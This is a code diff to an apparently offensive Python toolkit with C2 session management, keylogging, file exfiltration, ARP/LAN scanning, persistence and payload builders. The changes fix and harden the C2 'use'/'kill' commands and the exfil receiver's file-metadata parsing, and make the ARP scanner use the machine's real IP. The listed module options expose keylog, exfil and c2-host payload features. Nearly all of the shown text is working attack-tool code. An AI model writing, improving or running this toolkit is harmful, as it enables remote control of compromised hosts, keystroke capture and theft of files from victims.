@@ -280,12 +280,15 @@ def mod_c2():
                 for sid, (c, a) in SESSIONS.items(): print(f"  {sid}  {a}")
                 continue
             if cmd.startswith("use "):
-                c2 = cmd.split()[1]
+                parts = cmd.split(None, 1)
+                c2 = parts[1] if len(parts) > 1 else ""
                 if c2 in SESSIONS: current = c2
                 else: print("no such session")
                 continue
             if cmd.startswith("kill "):
-                sid = cmd.split()[1]
+                parts = cmd.split(None, 1)
+                sid = parts[1] if len(parts) > 1 else ""
+                if not sid: print("usage: kill N"); continue
                 if sid in SESSIONS:
                     SESSIONS[sid][0].close(); del SESSIONS[sid]; print(f"killed {sid}")
                     if current == sid: current = None
@@ -397,7 +400,7 @@ def mod_exfil():
 
 def mod_recv():
     section("EXFIL SERVER")
-    port = int(input("listen port [" + D.get("exfil", "12345") + "]: ").strip() or D.get("exfil", "12345"))
+    port = int(ask("listen port [%s]: " % D.get("exfil", "12345")) or D.get("exfil", "12345"))
     srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     srv.bind(("", port)); srv.listen(1)
     print(f"listening 0.0.0.0:{port}...")
@@ -415,13 +418,16 @@ def mod_recv():
             print("client disconnected before meta"); c.close(); srv.close(); return
         meta += d
     try:
-        parts = meta.decode().strip().split("|")
-        if len(parts) != 2:
-            print(f"invalid meta format (need 'name|size'): {meta!r}"); c.close(); srv.close(); return
-        name, sz = parts
+        meta_s = meta.decode().strip()
+    except UnicodeDecodeError:
+        print(f"non-utf8 meta: {meta!r}"); c.close(); srv.close(); return
+    try:
+        name, sz = meta_s.rsplit("|", 1)
         size = int(sz)
-    except (UnicodeDecodeError, ValueError) as e:
-        print(f"invalid meta: {e!r}"); c.close(); srv.close(); return
+        if not name:
+            raise ValueError("empty name")
+    except ValueError as e:
+        print(f"invalid meta: {e} ({meta!r})"); c.close(); srv.close(); return
     c.send(b"K")
     name = os.path.basename(name)
     dest = os.path.join(DATA, name); got = 0
@@ -538,9 +544,18 @@ def mod_arp():
         mymac = r[18:24]
     except Exception:
         pass
+    # resolve THIS interface's real IP, fallback: second addr of cidr (not always correct)
+    myip = socket.inet_aton(net2ip(base, 1))
+    try:
+        s2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s2.connect(("8.8.8.8", 80))
+        myip = socket.inet_ntoa(s2.getsockname()[0]).encode()
+        s2.close()
+    except Exception:
+        pass
     s.bind((interface, 0))
     eth = mymac + mymac + b"\x08\x06"
-    req = eth + b"\x00\x01\x08\x00" + b"\x06\x04" + b"\x00\x01" + mymac + socket.inet_aton(net2ip(base, 1)) + b"\x00" * 6
+    req = eth + b"\x00\x01\x08\x00" + b"\x06\x04" + b"\x00\x01" + mymac + myip + b"\x00" * 6
     found = []
     def arp_req(ip):
         pkt = req + socket.inet_aton(ip)
@@ -815,11 +830,9 @@ MODARGS = {
     "c2":      {"--port": "listen port"},
     "keylog":  {"--duration": "capture seconds"},
     "exfil":   {"--host": "listener ip", "--port": "listener port", "--file": "file to send"},
-    "recv":    {"--port": "listen port"},
-    "payload": {"--host": "c2 host", "--port": "c2 port"},
+    "lan":     {"--cidr": "cidr (192.168.1.0/24)"},
+    "arp":     {"--cidr": "cidr", "--iface": "interface (wlan0)"},
     "exe2":    {"--host": "c2 host", "--port": "c2 port"},
-    "lan":     {"--host": "cidr (192.168.1.0/24)"},
-    "arp":     {"--host": "cidr", "--iface": "interface (wlan0)"},
     "wifi":    {},
     "persist": {},
     "ops":     {},
